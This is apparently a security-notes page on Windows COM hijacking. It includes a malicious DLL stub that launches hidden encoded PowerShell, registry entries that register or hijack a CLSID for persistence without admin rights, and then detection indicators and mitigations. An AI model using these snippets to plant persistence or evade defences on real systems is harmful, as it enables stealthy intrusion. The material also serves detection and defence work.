# 🧬 COM Interface Abuse (Custom CLSID Hijack)

**COM Hijacking** is a powerful persistence and execution technique where attackers register a **malicious COM object** or redirect an existing one to load their payload. It abuses the Windows Component Object Model (COM) to achieve **stealth execution**, **UAC bypass**, and **evasion**.

> ⚠️ Used by malware like PlugX, Astaroth, and stealthy red teams. Triggers execution from legit Microsoft binaries (e.g., `mmc.exe`, `wscript.exe`, `svchost.exe`).

---

## 🛠️ What It Does
- COM objects are registered with unique CLSIDs in the Windows Registry
- Binaries like `eventvwr.exe` or `wscript.exe` auto-load these objects at runtime
- By hijacking the CLSID, attackers get their own DLL/code executed silently

---

## 💣 Persistence Example: Hijack CLSID Called by `eventvwr.exe`

### 1. Write a Malicious COM DLL
```cpp
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        WinExec("powershell -nop -w hidden -enc <payload>", 0);
    }
    return TRUE;
}
```

### 2. Register a Custom CLSID
```reg
[HKEY_CURRENT_USER\Software\Classes\CLSID\{Custom-GUID}]
@="Evil COM Object"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{Custom-GUID}\InprocServer32]
@="C:\Users\Public\evil.dll"
"ThreadingModel"="Apartment"
```
✅ Uses HKCU, so **no admin rights needed**

---

### 3. Hijack Known CLSID Path
```reg
[HKEY_CURRENT_USER\Software\Classes\AppID\{Target-AppID}]
"DllSurrogate"=""
```
Or replace CLSID reference used by `eventvwr.exe`, `mmc.exe`, `slui.exe`, etc.

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Custom CLSIDs in HKCU | Monitor registry writes to `HKCU\Software\Classes\CLSID\` |
| COM-loading processes launching unexpected binaries | Flag `mmc.exe`, `slui.exe` spawning `powershell.exe` or `cmd.exe` |
| DLLs loaded from user-writable paths | Alert on non-signed DLLs in `Public`, `AppData`, `Temp`

---

## 🔐 Mitigation Strategies
- Monitor and restrict COM registry paths
- Use AppLocker/WDAC to block unsigned DLLs and user-writable COM paths
- Disable known abused COM invokers like `slui.exe`, `eventvwr.exe` in high-security contexts
- Perform periodic audits of active CLSIDs and COM instantiation logs

---

> 🧠 COM hijacking doesn’t require persistence in startup folders or scheduled tasks — it just lives in the registry, waiting to be summoned by a trusted Windows app. Silent. Flexible. Deadly.
